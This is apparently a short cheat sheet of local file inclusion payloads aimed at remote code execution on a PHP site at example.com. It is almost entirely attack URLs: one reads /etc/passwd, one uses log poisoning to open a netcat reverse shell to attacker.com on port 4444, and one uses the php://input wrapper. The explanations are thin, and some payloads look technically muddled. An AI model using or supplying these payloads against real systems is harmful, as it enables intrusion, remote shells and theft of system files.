LFI payloads that can be used to achieve RCE:

Command Injection payload:

http://example.com/index.php?page=/etc/passwd&cmd=id

Reverse Shell payload:

http://example.com/index.php?page=/var/log/apache/access.log&cmd=nc%20-e%20/bin/bash%20attacker.com%204444

This payload will execute a reverse shell command that connects back to the attacker's system. The attacker can then use the shell to execute commands on the server.

PHP Wrappers payload:

http://example.com/index.php?page=php://input&cmd=cat%20/etc/passwd

This payload will use the "php://input" wrapper to execute the 'cat /etc/passwd' command on the server.
